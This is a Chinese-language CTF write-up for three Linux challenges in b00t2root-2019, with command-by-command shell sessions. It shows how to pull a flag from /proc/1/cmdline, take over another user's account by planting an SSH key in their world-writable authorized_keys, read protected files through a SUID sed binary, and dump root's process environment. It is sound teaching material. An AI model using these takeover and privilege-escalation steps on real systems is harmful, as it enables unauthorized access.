---
title: Linux Category Challs in b00t2root-2019
date: 2019-03-31 17:47:36
tags: [ctf, wp]
---

这个比赛有一类 linux 的题，感觉很有意思。

<!-- more -->

# Steve Rogers（LINUX Enumeration）

Steve knows there's a flag somewhere in plain sight. Login as `steve` and find it for him.

给了一个 socat 的脚本，连上去以后是一个 docker。看了一下 `steve` 家目录下没有什么东西，隐藏文件也是一些没用的像是 `.bashrc` 还有 `.profile` 之类的文件。可以先试试 `cat /etc/passwd` 能不能用，看看服务器上有哪些用户：

```bash
steve@d18fb074a417:~$ ls
steve@d18fb074a417:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
steve:x:1000:1000:,,,:/home/steve:/bin/bash
tony:x:1001:0:,,,:/home/tony:/bin/bash
```

可以看到除了一开始的 `root`，最下面还有 `steve` 和 `tony`两个用户，上面还有一个 `sshd`，说明服务器上起了 ssh。这里推荐一个关于 [Linux 提权基础（Basic Linux Privilege Escalation）](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)的网站，上面提供了很多可以提权的小命令。我们先用 `ps aux` 做一个尝试，查看有什么服务正在跑着，以及哪些用户对应着哪些服务：

```bash
steve@d18fb074a417:~$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0  18376  3108 pts/0    Ss   09:52   0:00 bash /tmp/42.sh
root        14  0.0  0.0  72296  3408 ?        Ss   09:52   0:00 /usr/sbin/sshd
root        16  0.0  0.0  55952  3344 pts/0    S    09:52   0:00 su -l steve
steve       18  0.0  0.0  18508  3444 pts/0    S    09:52   0:00 -su
steve       25  0.0  0.0  34400  3028 pts/0    R+   09:55   0:00 ps aux
steve@d18fb074a417:~$ cat /tmp/42.sh
cat: /tmp/42.sh: No such file or directory
```

可以看到一个 `bash /tmp/42.sh` 很引人注目，但是试图打开它的时候失败了。再试试 `ps -ef`，`man` 一下看看这两个参数：

```
...
     -A      Display information about other users' processes, including those without controlling terminals.
...
     -e      Identical to -A.

     -f      Display the uid, pid, parent pid, recent CPU usage, process start time, controlling tty, elapsed CPU usage, and the asso-
             ciated command.  If the -u option is also used, display the user name rather then the numeric uid.  When -o or -O is used
             to add to the display following -f, the command field is not truncated as severely as it is in other formats.
...
```

也就是显示 `uid`、`pid`、`ppid` 等相关信息，然后看看输出：

```bash
steve@d18fb074a417:~$ ps -ef
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 09:52 pts/0    00:00:00 bash /tmp/42.sh b00t2root{Cmd_l1
root        14     1  0 09:52 ?        00:00:00 /usr/sbin/sshd
root        16     1  0 09:52 pts/0    00:00:00 su -l steve
steve       18    16  0 09:52 pts/0    00:00:00 -su
steve       27    18  0 09:56 pts/0    00:00:00 ps -ef
```

我们在 pid 为 1 的进程中看到了 `bash /tmp/42.sh b00t2root{Cmd_l1`，不是很完整的一条 flag。本着 linux 下一切皆文件的思想，我们可以在 `/proc/1/` 下找到一个文件 `cmdline`，flag 就在里面：

```bash
steve@d18fb074a417:~$ ls /proc/1/
ls: cannot read symbolic link '/proc/1/cwd': Permission denied
ls: cannot read symbolic link '/proc/1/root': Permission denied
ls: cannot read symbolic link '/proc/1/exe': Permission denied
attr             exe        mounts         projid_map    status
autogroup        fd         mountstats     root          syscall
auxv             fdinfo     net            sched         task
cgroup           gid_map    ns             schedstat     timers
clear_refs       io         numa_maps      sessionid     timerslack_ns
cmdline          limits     oom_adj        setgroups     uid_map
comm             loginuid   oom_score      smaps         wchan
coredump_filter  map_files  oom_score_adj  smaps_rollup
cpuset           maps       pagemap        stack
cwd              mem        patch_state    stat
environ          mountinfo  personality    statm
steve@d18fb074a417:~$ cat /proc/1/cmdline
bash/tmp/42.shb00t2root{Cmd_l1n3_fl4g5_4r3_0bv10u5}steve@d18fb074a417:/home/tony$
```

# Tony Stank（LINUX Privilege Escalataion）

Professor Hulk requires a flag hidden in `tony`'s account to wield the infinity gauntlet. Retrieve it for him by any means necessary.

我们在上一道题目中发现服务器是开了 ssh 的，在这道题会派上很大的用场。我们尝试进到 tony 的家目录：

```bash
steve@e2797a47d8f5:~$ cd /home/tony
steve@e2797a47d8f5:/home/tony$ ls -la
total 24
drwxrwxrwx 1 tony root 4096 Mar 29 15:30 .
drwxr-x--x 1 root root 4096 Mar 29 15:30 ..
-rw-r--r-- 1 tony root  220 Mar 29 15:30 .bash_logout
-rw-r--r-- 1 tony root 3771 Mar 29 15:30 .bashrc
---------- 1 tony root   38 Mar 29 15:28 .flag
-rw-r--r-- 1 tony root  807 Mar 29 15:30 .profile
steve@e2797a47d8f5:/home/tony$ touch anything
steve@e2797a47d8f5:/home/tony$ ls
anything
```

看到了一个 `.flag` 文件，很有可能就是我们要找的 flag。然而所属用户是 tony，我们需要想办法变成 tony。因为本地是开了 ssh 的，我们可以在 steve 的家目录生成 ssh 密钥和公钥，并将公钥复制到 `/home/tony/.ssh/authorized_keys` 中，这样我们如果从本地 ssh 访问 tony 就不需要输入密码了。可以把用户变成 tony：

```bash
steve@e2797a47d8f5:/home/tony$ mkdir .ssh
steve@e2797a47d8f5:/home/tony$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/steve/.ssh/id_rsa):
Created directory '/home/steve/.ssh'.
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /home/steve/.ssh/id_rsa.
Your public key has been saved in /home/steve/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:Dy7aH7T8rwupoal6mTAT/uFk2kL0ZoMRp5NNAirlxq4 steve@e2797a47d8f5
The key's randomart image is:
+---[RSA 2048]----+
|o .              |
|.* o             |
|o %              |
|oO .             |
|o.*     S        |
|+= O   + =       |
|E+Xoo o B .      |
| o++ = + +       |
|.oo.+ o.. ++.    |
+----[SHA256]-----+
steve@e2797a47d8f5:/home/tony$ ls ~/.ssh
id_rsa  id_rsa.pub
steve@e2797a47d8f5:/home/tony$ cat ~/.ssh/id_rsa.pub >.ssh/authorized_keys
steve@e2797a47d8f5:/home/tony/.ssh$ cat .ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzOsnxC56QPjbS2Glioff2IO/z/eTpRkOPqNv0qxzRvcwIJpOom8GHU6ae7VOs4466EIUbxIO1oK3xV81CrfCOITUcZ0WCYohVUfY1w0MM65ILQ4SGUdhNiVP9dnu8N/RVfIrcs9dc4Wlb+KixmgURhW9bX6F5As+7iHqCiqpsDN4fyq78lC9ci+Rgg9fgVkboSeMIiqaUK/Ww0W7lwe0mGm4UaTc94CSQRdRrnOutDNKFeLXYl46s+V7pHtFrmSaYZoNI09IkllWcaA4WYlXdGD8qHGwpkptCUjgufkl1e2DetLNTeuwtbj4DhY7af1r9+Vdaa089yeGrgAemgyo9 steve@e2797a47d8f5
steve@e2797a47d8f5:/home/tony/.ssh$ ssh -i ~/.ssh/id_rsa tony@localhost
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:n6A8y008mc7HfJYLy8Fw7nexXjofQ8J/ZOQmEtk2TX0.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-1032-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

tony@e2797a47d8f5:~$ id
uid=1001(tony) gid=0(root) groups=0(root)
tony@e2797a47d8f5:~$ ls -al
total 36
drwxrwxrwx 1 tony  root  4096 Mar 31 11:38 .
drwxr-x--x 1 root  root  4096 Mar 29 15:30 ..
-rw-r--r-- 1 tony  root   220 Mar 29 15:30 .bash_logout
-rw-r--r-- 1 tony  root  3771 Mar 29 15:30 .bashrc
drwx------ 2 tony  root  4096 Mar 31 11:38 .cache
---------- 1 tony  root    38 Mar 29 15:28 .flag
-rw-r--r-- 1 tony  root   807 Mar 29 15:30 .profile
drwxrwxr-x 2 steve steve 4096 Mar 31 11:37 .ssh
-rw-rw-r-- 1 steve steve    0 Mar 31 11:34 anything
tony@e2797a47d8f5:~$ cat .flag
cat: .flag: Permission denied
```

变成 tony 后，发现依然无法查看，因为无论是哪个用户，对 `.flag` 文件没有任何权限。我们尝试进行[提权](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)：

```bash
tony@e2797a47d8f5:~$ find / -perm -u=s -type f 2>/dev/null
/bin/sed
/bin/mount
/bin/umount
/bin/su
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
```

> 注：在类 Unix 系统中，/dev/null，或称空设备，是一个特殊的设备文件，它丢弃一切写入其中的数据，读取它则会立即得到一个 EOF。 在程序员行话，尤其是 Unix 行话中，/dev/null 被称为比特桶或者黑洞。

查找到一些我们能够执行并获取更高权限的一些命令，涉及到一些 [SUID 的知识](https://www.linux.com/blog/what-suid-and-how-set-suid-linuxunix)。

```bash
steve@d18fb074a417:~$ ls -l /bin/sed
-rwxrwx--- 1 root  root  109000 Jan 30 2018 /bin/sed
steve@d18fb074a417:~$ /bin/sed
-su: /bin/sed: Permission denied
tony@e2797a47d8f5:~$ id
uid=1001(tony) gid=0(root) groups=0(root)
```

我们发现 steve 是无法执行 `/bin/sed` 的，然而 tony 在 root 这个用户组中，是可以执行的。了解一下[如何通过 sed 查看文件](https://gtfobins.github.io/gtfobins/sed/#file-read)（在上个礼拜的 Securinets 中也有涉及），然后就能拿到 flag：

```bash
tony@e2797a47d8f5:~$ /bin/sed '' .flag
b00t2root{1_h0p3_ssh_15_th3_0nly_w4y}
```

# Groot（LINUX Post-Exploitation）

We know Groot's no more but we can still hear him in the environment. Can you?

根据提示可以知道 flag 基本上是在环境变量里：

```bash
tony@e2797a47d8f5:~$ env
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SSH_CONNECTION=127.0.0.1 57394 127.0.0.1 22
USER=tony
PWD=/home/tony
HOME=/home/tony
SSH_CLIENT=127.0.0.1 57394 22
SSH_TTY=/dev/pts/1
MAIL=/var/mail/tony
TERM=xterm
SHELL=/bin/bash
SHLVL=1
LOGNAME=tony
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
_=/usr/bin/env
```

还是在 `/proc/1/` 下查看 `environ`，没有权限。因为我们现在是 tony，直接用 sed 就能查看，得到 flag：

```bash
tony@e2797a47d8f5:~$ ps -aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0  18376  3044 pts/0    Ss   11:28   0:00 bash /tmp/42.sh
root        14  0.0  0.0  72296  3356 ?        Ss   11:28   0:00 /usr/sbin/sshd
root        16  0.0  0.0  55952  3300 pts/0    S    11:28   0:00 su -l steve
steve       18  0.0  0.0  18508  3412 pts/0    S    11:28   0:00 -su
steve       64  0.0  0.0  45188  5572 pts/0    S+   11:56   0:00 ssh -i /home/st
root        65  0.0  0.0 103852  7340 ?        Ss   11:56   0:00 sshd: tony [pri
tony        80  0.0  0.0 103852  3528 ?        R    11:56   0:00 sshd: tony@pts/
tony        81  0.0  0.0  18508  3500 pts/1    Ss   11:56   0:00 -bash
tony        91  0.0  0.0  36700  3140 pts/1    R+   11:58   0:00 ps -aux
tony@e2797a47d8f5:~$ cat /proc/1/environ
cat: /proc/1/environ: Permission denied
tony@e2797a47d8f5:~$ sed '' /proc/1/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=e2797a47d8f5TERM=xtermflag=b00t2root{1_44aaaaaammmm_gr0000000ooooooOOO7777}HOME=/root
```

# References

https://www.youtube.com/watch?v=68Tgdx_Y8ng
https://www.youtube.com/watch?v=Qg3qOjylZpw
https://www.youtube.com/watch?v=RmGl1mje1Ho
